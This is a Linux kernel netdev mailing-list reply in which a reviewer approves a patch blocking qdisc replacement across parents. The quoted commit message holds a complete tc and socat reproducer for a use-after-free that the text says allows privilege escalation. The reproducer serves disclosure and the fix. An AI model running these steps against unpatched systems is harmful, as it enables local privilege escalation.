Return-Path: <netdev+bounces-159004-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sy.mirrors.kernel.org (sy.mirrors.kernel.org [147.75.48.161])
	by mail.lfdr.de (Postfix) with ESMTPS id B3D3CA1414C
	for <lists+netdev@lfdr.de>; Thu, 16 Jan 2025 18:53:45 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sy.mirrors.kernel.org (Postfix) with ESMTPS id 0F8AD7A338E
	for <lists+netdev@lfdr.de>; Thu, 16 Jan 2025 17:53:37 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 59E6E1DE4F8;
	Thu, 16 Jan 2025 17:53:40 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="mmtkhBs8"
X-Original-To: netdev@vger.kernel.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 356E8148855
	for <netdev@vger.kernel.org>; Thu, 16 Jan 2025 17:53:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1737050020; cv=none; b=XtpEfGne6GcrAy/cQVFcmeeYrKzW74hAfyoZqtCLO79HA0177uEjALVFTu3eq0ZZKlw9M6IsgrC3+ykFFXx+AtEt2mcZbdPAFCiGy0DWDLqtzXkTsqxESWd9qZ2URz8L1FNZpRAcP45TOUxylbzBaS7Opxer3rUQHegb6Ziqb5w=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1737050020; c=relaxed/simple;
	bh=g3yuXcbtmsBQgTodO1Cgx4mcXzwa6sQiGP1wKl3Uf84=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=tmkuIsV20N7jUrN3c0zjV+ejgF7s0yqzOSwYk9D0/6zzQqABf8f5YZArfX7jdrVjdRmdjChBE5u44KRmk+CNyXMvIi+Tx6F7amu2AloBCmhEcqmJkanpO7tzqOvmvRTTiuD8ZJlHZMdrranD1FB0dFYVQWoshlsyFSIKzAKcxtU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=mmtkhBs8; arc=none smtp.client-ip=10.30.226.201
Received: by smtp.kernel.org (Postfix) with ESMTPSA id C4D8DC4CED6;
	Thu, 16 Jan 2025 17:53:37 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
	s=k20201202; t=1737050019;
	bh=g3yuXcbtmsBQgTodO1Cgx4mcXzwa6sQiGP1wKl3Uf84=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
	b=mmtkhBs8dVy4rbgmKe4xtHbJVcpV5f5hqOZTTEaVpJxTBVrZxMlkZzRHUGb3DymY0
	 lwrYaAoy9txo9mW4uvDVXTALY8vwvn24YPwpu8dZH3vBU91kik4XbMVHiobZLjEFCH
	 NjaZg54OLzy/cqqjqLzWLsawfNmNhOHbBXA2v2d8MMZG0LgiMA0G5+Z7iUtveI+ZBN
	 Lob5ahLOVES0yLMOAIWqzesfZBgEBmgINl8CbbTL0B6FKfaqnuLxLTAbembjF97Q1p
	 XKuO0ADjljKesQ//97xTldEwcoaLnnoKozI5cpIbm46I0dY0VHg1PPcux68Pk6W9sK
	 vXzuGOzCSFOng==
Date: Thu, 16 Jan 2025 17:53:35 +0000
From: Simon Horman <horms@kernel.org>
To: Jakub Kicinski <kuba@kernel.org>
Cc: davem@davemloft.net, netdev@vger.kernel.org, edumazet@google.com,
	pabeni@redhat.com, andrew+netdev@lunn.ch,
	Jamal Hadi Salim <jhs@mojatatu.com>, xiyou.wangcong@gmail.com,
	jiri@resnulli.us
Subject: Re: [PATCH net v4] net: sched: Disallow replacing of child qdisc
 from one parent to another
Message-ID: <20250116175335.GD6206@kernel.org>
References: <20250116013713.900000-1-kuba@kernel.org>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20250116013713.900000-1-kuba@kernel.org>

On Wed, Jan 15, 2025 at 05:37:13PM -0800, Jakub Kicinski wrote:
> From: Jamal Hadi Salim <jhs@mojatatu.com>
> 
> Lion Ackermann was able to create a UAF which can be abused for privilege
> escalation with the following script
> 
> Step 1. create root qdisc
> tc qdisc add dev lo root handle 1:0 drr
> 
> step2. a class for packet aggregation do demonstrate uaf
> tc class add dev lo classid 1:1 drr
> 
> step3. a class for nesting
> tc class add dev lo classid 1:2 drr
> 
> step4. a class to graft qdisc to
> tc class add dev lo classid 1:3 drr
> 
> step5.
> tc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024
> 
> step6.
> tc qdisc add dev lo parent 1:2 handle 3:0 drr
> 
> step7.
> tc class add dev lo classid 3:1 drr
> 
> step 8.
> tc qdisc add dev lo parent 3:1 handle 4:0 pfifo
> 
> step 9. Display the class/qdisc layout
> 
> tc class ls dev lo
>  class drr 1:1 root leaf 2: quantum 64Kb
>  class drr 1:2 root leaf 3: quantum 64Kb
>  class drr 3:1 root leaf 4: quantum 64Kb
> 
> tc qdisc ls
>  qdisc drr 1: dev lo root refcnt 2
>  qdisc plug 2: dev lo parent 1:1
>  qdisc pfifo 4: dev lo parent 3:1 limit 1000p
>  qdisc drr 3: dev lo parent 1:2
> 
> step10. trigger the bug <=== prevented by this patch
> tc qdisc replace dev lo parent 1:3 handle 4:0
> 
> step 11. Redisplay again the qdiscs/classes
> 
> tc class ls dev lo
>  class drr 1:1 root leaf 2: quantum 64Kb
>  class drr 1:2 root leaf 3: quantum 64Kb
>  class drr 1:3 root leaf 4: quantum 64Kb
>  class drr 3:1 root leaf 4: quantum 64Kb
> 
> tc qdisc ls
>  qdisc drr 1: dev lo root refcnt 2
>  qdisc plug 2: dev lo parent 1:1
>  qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p
>  qdisc drr 3: dev lo parent 1:2
> 
> Observe that a) parent for 4:0 does not change despite the replace request.
> There can only be one parent.  b) refcount has gone up by two for 4:0 and
> c) both class 1:3 and 3:1 are pointing to it.
> 
> Step 12.  send one packet to plug
> echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
> step13.  send one packet to the grafted fifo
> echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))
> 
> step14. lets trigger the uaf
> tc class delete dev lo classid 1:3
> tc class delete dev lo classid 1:1
> 
> The semantics of "replace" is for a del/add _on the same node_ and not
> a delete from one node(3:1) and add to another node (1:3) as in step10.
> While we could "fix" with a more complex approach there could be
> consequences to expectations so the patch takes the preventive approach of
> "disallow such config".
> 
> Joint work with Lion Ackermann <nnamrec@gmail.com>
> Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
> Signed-off-by: Jamal Hadi Salim <jhs@mojatatu.com>
> Signed-off-by: Jakub Kicinski <kuba@kernel.org>
> ---
> v4:
>  - compare the parent directly from metadata, rather than lookup result
> v3: https://lore.kernel.org/20250111151455.75480-1-jhs@mojatatu.com

Reviewed-by: Simon Horman <horms@kernel.org>


